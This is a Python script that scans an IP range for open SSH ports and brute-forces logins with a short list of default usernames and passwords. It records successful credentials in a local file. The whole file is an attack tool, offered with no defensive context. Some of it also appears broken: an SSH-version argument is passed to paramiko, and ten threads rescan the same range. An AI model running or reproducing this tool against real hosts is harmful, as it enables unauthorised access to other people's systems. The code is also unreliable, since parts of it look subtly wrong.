import argparse
import socket
import ipaddress
import threading
import paramiko


def parse_arguments():
    """Parse the command-line arguments"""

    parser = argparse.ArgumentParser(description="Scan an IP range for open SSH ports and attempt to authenticate.")
    parser.add_argument("range",
                        help="IP range in CIDR, hyphenated, or dotted decimal format."
                             "Example: 127.0.0.1/24, 127.0.0.1-127.0.0.255, 127.0.0.1")
    return parser.parse_args()


def grab_banner(ip, port):
    """Attempts to grab the SSH banner from the given IP address and port"""

    banner = ""
    try:
        sock = socket.socket()
        sock.connect((ip, port))
        sock.settimeout(2)
        banner = sock.recv(1024).decode().strip()
    except (socket.timeout, ConnectionRefusedError):
        pass
    finally:
        sock.close()
    return banner


def authenticate(ip, username, password, protocol):
    """Attempts to authenticate using the supplied username and password on the given IP address"""

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, port=22,
                       allow_agent=False, look_for_keys=False, banner_timeout=2, ssh_version=2 if protocol == "SSH-2.0" else 1)
    except (paramiko.ssh_exception.AuthenticationException,
            paramiko.ssh_exception.NoValidConnectionsError, socket.timeout, OSError):
        return False
    finally:
        client.close()
    return True


def brute_force(ip, username, passwords, protocol):
    """Brute forces the login using the supplied usernames and passwords on the given IP address"""

    for password in passwords:
        if authenticate(ip, username, password, protocol):
            print(f"\033[92m[+] Successfully authenticated with {username}:{password} on {ip}\033[0m")
            with open("successful-logins.txt", "a") as f:
                f.write(f"{ip},{username},{password}\n")
            return
    print(f"\033[91m[-] Failed to authenticate with {username} on {ip}\033[0m")


def scan_range(ip_range):
    """Scans the IP range for open SSH ports and attempt to authenticate"""

    for ip in ipaddress.IPv4Network(ip_range):
        banner = grab_banner(str(ip), 22)
        if not banner:
            continue

        print(f"\n[*] Scanning {ip}")
        print(f"\033[94m[+] Found open port 22 on {ip} ({banner})\033[0m")

        if "SSH-1.5" in banner:
            protocol = "SSH-1.5"
        else:
            protocol = "SSH-2.0"

        usernames = ["root", "admin", "ubuntu", "kali"]
        passwords_try_1 = ["root", "kali", "123456"]
        passwords_try_2 = ["qwerty", "debian", "admin"]

        for username in usernames:
            brute_force(ip, username, passwords_try_1, protocol)
            if not authenticate(ip, username, passwords_try_1[0], protocol):
                continue
            brute_force(ip, username, passwords_try_2, protocol)
            break


def main():
    args = parse_arguments()
    ip_range = args.range

    # Scan IP range using 10 threads
    threads = []
    for i in range(10):
        t = threading.Thread(target=scan_range, args=(ip_range,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()


if __name__ == "__main__":
    main()
